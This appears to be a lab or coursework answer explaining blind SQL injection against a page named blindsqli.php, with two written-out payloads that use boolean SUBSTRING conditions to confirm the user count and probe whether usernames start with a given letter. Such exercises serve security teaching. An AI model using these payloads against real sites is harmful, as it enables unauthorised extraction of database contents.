3- blind sql injection
	the website uses blindsqli.php?user=bob to display information about the user 'bob'
a)
		changing this to blindsqli.php?user=bob' AND SUBSTRING((select COUNT(id) from users), 1, 1)=9 -- //
		makes it so the profile 'bob' only appears when the substring condition is true, with this we can verify
		that the amount of users in the database is 9
b)
		additionally we can change it to blindsqli.php?user=bob' AND SUBSTRING((select username from users WHERE
		username LIKE 'a%' LIMIT 1), 1, 1) = 'a' -- //
		this makes it so the profile appears if at least 1 username in the database starts with 'a'
